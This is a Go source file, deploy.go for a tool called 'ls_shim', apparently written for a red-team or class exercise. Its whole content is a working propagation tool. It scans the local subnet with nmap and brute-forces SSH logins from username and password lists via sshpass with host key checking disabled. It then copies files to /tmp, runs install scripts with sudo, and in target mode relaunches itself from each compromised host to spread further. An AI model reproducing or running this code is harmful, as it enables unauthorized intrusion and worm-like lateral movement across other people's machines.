// Michael Burke

package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
)

var systemOS string = getOS()
var isVerbose bool = false
var isDemo bool = false
var isThreaded bool = false
var isTarget bool = false
var targetIP string
var usernames []string
var passwords []string
var installedIPs []string
var ignoreIPs []string
var wg sync.WaitGroup

func main() {
	//Handle arguments
	args := os.Args
	if !handleArgs(args) {
		return
	}
	if isVerbose {
		fmt.Println("OS is: " + systemOS)
	}
	installDependencies()
	if isVerbose {
		fmt.Println("Dependencies installed")
	}
	if isTarget && !isDemo {
		//Transfer files to target machine for deployment
		transferFilesRunner([]string{targetIP})
	} else {
		//Find all IPs on subnet 0/24
		ips := findIPs()
		fmt.Print("IP list: ")
		fmt.Println(ips)
		if !isDemo {
			//Transfer files to all devices on network
			transferFilesRunner(ips)
		}
	}

	//Print final output
	if isVerbose && !isDemo {
		fmt.Println("Installed on the following IPs:")
		for i := 0; i < len(installedIPs); i++ {
			fmt.Println(installedIPs[i])
		}
	} else if !isVerbose {
		fmt.Println("Installations finished.")
	}

}

func runRemote(username, password, ip string) {
	if isVerbose {
		fmt.Print("Running exploit on remote system: " + username + "@" + ip)
	} else {
		fmt.Print("Installing on " + ip)
		if isThreaded {
			fmt.Println(" (DETACHED)")
		} else {
			fmt.Println()
		}
	}
	//Use sshpass to connect to host without having to input a password
	cmd := exec.Command("sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", username+"@"+ip)
	buffer := bytes.Buffer{}
	//Commands used to deploy exploit on remote system
	command := "cd /tmp/ls_shim/\n" +
		"echo " + password + " | sudo -S chmod +x deploy/dependencies.sh\n" +
		"echo " + password + " | sudo -S ./deploy/dependencies.sh\n" +
		"echo " + password + " | sudo -S chmod +x install.sh\n" +
		"echo " + password + " | sudo -S ./install.sh\n"
	if isTarget {
		//If this is a target, add commands to deploy to other devices
		command += "cd deploy\n" +
			"echo " + password + " | sudo -S go run deploy.go -i " + GetOutboundIP() + " -m --user-list " + strings.Join(usernames, ",") + " --password-list " + strings.Join(passwords, ",") + "\n"
	}
	command += "echo " + password + " | sudo -S rm -rf /tmp/ls_shim\n"
	//Write command to buffer
	buffer.Write([]byte(command))
	cmd.Stdin = &buffer
	if isVerbose {
		//Command output here is extremely crowded if using multithreading;
		//for that reason, multithreading and verbose can't be used together.
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
	}
	//Run commands on remote system
	err := cmd.Run()
	if err != nil {
		if isVerbose {
			fmt.Fprintln(os.Stderr, err)
		}
		fmt.Println("Couldn't install on " + ip)
	} else {
		installedIPs = append(installedIPs, ip)
		if isThreaded {
			fmt.Println("Finished installing on " + ip)
		}
	}
}

func sshUp(ip string) bool {
	//Run a simple nmap scan to see if ssh is up on the target IP
	cmd := exec.Command("nmap", ip, "-p", "22", "-oG", ".nmapscan-"+ip)
	cmd.Run()
	//Read the file and parse the output
	res := strings.Split(readFile(".nmapscan-"+ip), "\n")
	os.Remove(".nmapscan-" + ip)
	for i := 0; i < len(res); i++ {
		//If port 22 is open, return true
		if strings.Index(res[i], "Ports: 22") != -1 {
			str := res[i][strings.Index(res[i], "/")+1:]
			str = str[:strings.Index(str, "/")]
			if str == "open" {
				return true
			}
		}
	}
	return false
}

func transferFilesRunner(ips []string) {
	//Runner for transferFiles; this is its own separate function
	//in order to make multithreading easier.

	//Cycle through the list of IPs
	for i := 0; i < len(ips); i++ {
		if isVerbose {
			fmt.Println("Scanning port 22 on " + ips[i])
		}
		//Make sure SSH is enabled on port 22 for the target IP
		if sshUp(ips[i]) {
			if isThreaded {
				//If multithreading is enabled, run transferFiles as a gorouting
				fmt.Println("Checking users on " + ips[i] + " (DETACHED)")
				wg.Add(1)
				go transferFiles(ips[i])
			} else {
				transferFiles(ips[i])
			}
		} else {
			fmt.Println("Host " + ips[i] + " does not have SSH enabled. Skipping...")
		}
	}
	//Wait for deployment to finish on all devices
	if isThreaded {
		wg.Wait()
	}

}

func transferFiles(ip string) {
	if isVerbose {
		fmt.Println("Transferring files to " + ip)
	}
	complete := false
	//Check all possible username+password combinations until one succeeds
	for u := 0; u < len(usernames); u++ {
		if isVerbose {
			fmt.Println("Trying user " + usernames[u])
		}
		complete = false
		for p := 0; p < len(passwords); p++ {
			if isVerbose {
				command := []string{"sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u] + "@" + ip + ":/tmp/"}
				fmt.Println(command)
			}
			//Use SCP to transfer the files, since we know SSH is enabled.
			cmd := exec.Command("sshpass", "-p", passwords[p], "scp", "-r", "-o", "StrictHostKeyChecking=no", "../../ls_shim", usernames[u]+"@"+ip+":/tmp/")
			err := cmd.Run()
			if err == nil {
				if isVerbose {
					fmt.Println("Files sent")
				}
				//After file transfer has succeeded, run commands on remote system to install
				runRemote(usernames[u], passwords[p], ip)
				complete = true
				break
			}
		}
		if complete {
			break
		} else {
			if isVerbose {
				fmt.Println("User " + usernames[u] + " failed. Trying next user...")
			}
		}
	}
	if !complete {
		fmt.Println("Installation on " + ip + " failed.")
	}
	if isThreaded {
		wg.Done()
	}
}

func findIPs() []string {
	//Find all valid IPs on the 0/24 subnet
	var ipList []string
	localIp := GetOutboundIP()
	if isVerbose {
		fmt.Println("Local IP is " + localIp)
	}
	//Get the 0/24 subnet
	ipRange := getPrefix(localIp) + ".0/24"
	fmt.Println(ipRange)
	//Ping scan every IP in the subnet and store which ones repond in greppable format
	cmd := exec.Command("nmap", "-sn", ipRange, "-oG", ".ipscan_lsshim")
	cmd.Run()
	ipStr := readFile(".ipscan_lsshim")
	os.Remove(".ipscan_lsshim")
	ipArr := strings.Split(ipStr, "\n")
	//Go through the file and store every valid target IP
	for i := 0; i < len(ipArr); i++ {
		if strings.Index(ipArr[i], "Host: ") != -1 {
			ip := ipArr[i][strings.Index(ipArr[i], "Host: ")+6 : strings.Index(ipArr[i], " (")]
			if ip != localIp && !contains(ignoreIPs, ip) {
				ipList = append(ipList, ip)
			} else if isVerbose {
				fmt.Println("Ignoring " + ip)
			}
		}
	}
	return ipList
}

func getSuffix(ip string) string {
	newStr := strings.Replace(ip, ".", "!", 2)
	index := strings.Index(newStr, ".")
	suffix := newStr[index+1:]
	suffix = suffix + "/24"
	return suffix
}
func getPrefix(ip string) string {
	newStr := strings.Replace(ip, ".", "!", 2)
	index := strings.Index(newStr, ".")
	prefix := strings.Replace(newStr[:index], "!", ".", 2)
	return prefix
}

func getOS(isFail ...bool) string {
	var ret_os string
	checkID := false
	//Nifty little code to let us call getOS with or without a parameter
	if len(isFail) > 0 && isFail[0] {
		checkID = true
	}
	//Read /etc/os-release to find what distro the host is running on
	os_str := readFile("/etc/os-release")
	os_split := strings.Split(os_str, "\n")
	for i := 0; i < len(os_split); i++ {
		//Child distros will have ID_LIKE instead of ID. Check for both
		matchString := "ID_LIKE="
		if checkID {
			matchString = "ID="
		}
		if strings.Index(os_split[i], matchString) == 0 {
			ret_os = strings.Replace(os_split[i], matchString, "", 1)
			ret_os = strings.Replace(ret_os, `"`, "", -1)
			break
		}
	}
	if ret_os == "" && !checkID {
		// If ID_LIKE wasn't found, then seach for ID= instead
		return getOS(true)
	}
	return ret_os
}

func handleArgs(args []string) bool {
	//Variables for whether usernames & passwords are lists or not
	var pIsList, uIsList, uIsSingle, pIsSingle bool
	if len(args) > 1 {
		for i := 1; i < len(args); i++ {
			//TODO: Add checking for if args[i+1] exists
			if args[i] == "--demo" {
				isDemo = true
			} else if args[i] == "-u" {
				if uIsList {
					fmt.Println("Error: cannot supply both -u and --user-list")
					return false
				}
				uIsSingle = true
				usernames = append(usernames, args[i+1])
			} else if args[i] == "-p" {
				if pIsList {
					fmt.Println("Error: cannot supply both -p and --password-list")
					return false
				}
				pIsSingle = true
				passwords = append(passwords, args[i+1])
			} else if args[i] == "--user-list" {
				if uIsSingle {
					fmt.Println("Error: cannot supply both -u and --user-list")
					return false
				}
				uIsList = true
				usernames = strings.Split(args[i+1], ",")
			} else if args[i] == "--password-list" {
				if pIsSingle {
					fmt.Println("Error: cannot supply both -p and --password-list")
					return false
				}
				pIsList = true
				passwords = strings.Split(args[i+1], ",")
			} else if args[i] == "-i" || args[i] == "--ignore" {
				if isTarget {
					fmt.Println("Error: --ignore is not compatible with --target")
					return false
				}
				ignoreIPs = strings.Split(args[i+1], ",")
			} else if args[i] == "-v" || args[i] == "--verbose" {
				if !isThreaded {
					isVerbose = true
				} else {
					fmt.Println("Error: verbose is not compatible with multithreading")
					return false
				}
			} else if args[i] == "-m" || args[i] == "--multi" {
				if !isVerbose {
					isThreaded = true
				} else {
					fmt.Println("Error: verbose is not compatible with multithreading")
					return false
				}
			} else if args[i] == "-t" || args[i] == "--target" {
				if len(ignoreIPs) != 0 {
					fmt.Println("Error: --ignore is not compatible with --target")
					return false
				}
				isTarget = true
				targetIP = args[i+1]
			} else if args[i] == "--help" || args[i] == "-h" {
				fmt.Println("ls_shim deploy\n\n" +
					"usage: go run deploy.go -u [username] -p [password] [args]\n" +
					"-v or --verbose			|	Enable verbose output\n" +
					"-i [IPs] or --ignore [IPS]	|	Specify a list of IPs to ignore, separated by commas\n" +
					"-m or --multi			|	Run in multithreaded mode. Not compatible with verbose.\n" +
					"-t [IP] or --target [IP]	|	Install on a remote machine & deploy from it\n" +
					"				|	instead of the host machine. Not compatible with -i\n" +
					"--help or -h			|	Display this help menu\n" +
					"--password-list [PASSWORDS]	|	Specify a list of passwords, separated by commas\n" +
					"--user-list [USERS]		|	Specify a list of users, separated by commas",
				)
				return false
			}
		}
	}
	if isDemo || ((pIsList || pIsSingle) && (uIsList || uIsSingle)) {
		//If this is a demo OR if at least one password & username
		//were provided, arguments are valid
		return true
	}
	if !(uIsList || uIsSingle) {
		fmt.Println("Error: must supply at least one username")
		return false
	}
	if !(pIsList || pIsSingle) {
		fmt.Println("Error: must supply at least one password")
		return false
	}
	fmt.Println("Error: not enough arguments supplied. Exiting...")
	return false
}

func installDependencies() {
	//We need to install both sshpass and nmap,
	//nmap for scanning ports and sshpass
	//for using ssh with a plaintext password
	if systemOS == "debian" {
		cmd := exec.Command("apt-get", "install", "sshpass", "-y")
		cmd.Run()
		cmd = exec.Command("apt-get", "install", "nmap", "-y")
		cmd.Run()
	} else if systemOS == "arch" {
		cmd := exec.Command("pacman", "-S", "sshpass", "--noconfirm")
		cmd.Run()
		cmd = exec.Command("pacman", "-S", "nmap", "--noconfirm")
		cmd.Run()
	} else if strings.Index(systemOS, "rhel") != -1 {
		//sshpass doesn't have a repo on centOS as far as I can tell, so
		//we need to install it from a rpm package instead
		cmd := exec.Command("curl", "http://mirror.centos.org/centos/7/extras/x86_64/Packages/sshpass-1.06-2.el7.x86_64.rpm", "-o", "sshpass.rpm")
		cmd.Run()
		cmd = exec.Command("yum", "localinstall", "sshpass.rpm", "-y")
		cmd.Run()
		cmd = exec.Command("rm -f", "sshpass.rpm")
		cmd.Run()
		cmd = exec.Command("yum", "install", "nmap", "-y")
		cmd.Run()
	} else if systemOS == "fedora" {
		cmd := exec.Command("dnf", "install", "sshpass", "-y")
		cmd.Run()
		cmd = exec.Command("dnf", "install", "nmap", "-y")
		cmd.Run()
	}
}

func readFile(path string) string {
	dat, _ := ioutil.ReadFile(path)
	str := string(dat)
	return str
}

func contains(s []string, str string) bool {
	//Golang doesn't have a built-in function for contains
	for _, v := range s {
		if v == str {
			return true
		}
	}

	return false
}

func GetOutboundIP() string {
	//Dial a connection to a WAN IP to get the box's correct IP address.
	//Note that this doesn't actually establish a connection,
	//but simply pretends to setup one. This is enough to get us the IP
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	ip := localAddr.IP
	ipstr := ip.String()
	return ipstr
}
